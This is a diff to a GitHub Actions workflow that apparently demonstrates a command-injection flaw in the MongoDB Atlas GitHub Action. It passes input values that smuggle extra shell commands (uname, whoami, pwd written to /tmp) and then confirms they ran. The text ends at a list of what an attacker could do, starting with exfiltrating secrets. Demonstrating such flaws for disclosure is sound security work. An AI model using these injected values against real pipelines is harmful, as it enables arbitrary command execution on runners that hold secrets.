@@ -13,20 +13,40 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Demonstrate Multiple Injection Vectors
+      - name: Demonstrate Multiple Injection Vectors - Delete Project
         uses: mongodb/atlas-github-action@v0.2.0
+        continue-on-error: true
         with:
-          # Multiple injection points demonstrated
-          delete-project-id: "fake-id; echo '=== INJECTION 1: delete-project-id ===' && date && echo 'Runner OS:' && uname -a #"
-          delete-cluster-name: "fake-cluster; echo '=== INJECTION 2: delete-cluster-name ===' && echo 'Current user:' && whoami #"
+          # Injection via delete-project-id
+          # Format: atlas project delete ${{ inputs.delete-project-id }} --force
+          delete-project-id: "507f1f77bcf86cd799439011; echo '=== INJECTION 1: delete-project-id ===' > /tmp/injection1.txt && date >> /tmp/injection1.txt && uname -a >> /tmp/injection1.txt || true #"
+      
+      - name: Demonstrate Multiple Injection Vectors - Delete Cluster
+        uses: mongodb/atlas-github-action@v0.2.0
+        continue-on-error: true
+        with:
+          # Injection via delete-cluster-name
+          # Format: atlas cluster delete ${{ inputs.delete-cluster-name }} --force --projectId ${{ inputs.delete-project-id }}
+          delete-cluster-name: "test-cluster; echo '=== INJECTION 2: delete-cluster-name ===' > /tmp/injection2.txt && whoami >> /tmp/injection2.txt && pwd >> /tmp/injection2.txt || true #"
+          delete-project-id: "507f1f77bcf86cd799439011"
 
-      - name: Show What Attacker Could Access
+      - name: Verify Injections Executed
         shell: bash
         run: |
           echo "=========================================="
           echo "VULNERABILITY CONFIRMED - Multiple Vectors"
           echo "=========================================="
           echo ""
+          if [ -f /tmp/injection1.txt ]; then
+            echo "✅ Injection 1 (delete-project-id) executed:"
+            cat /tmp/injection1.txt
+            echo ""
+          fi
+          if [ -f /tmp/injection2.txt ]; then
+            echo "✅ Injection 2 (delete-cluster-name) executed:"
+            cat /tmp/injection2.txt
+            echo ""
+          fi
           echo "An attacker could inject commands that:"
           echo ""
           echo "1. Exfiltrate Secrets:"
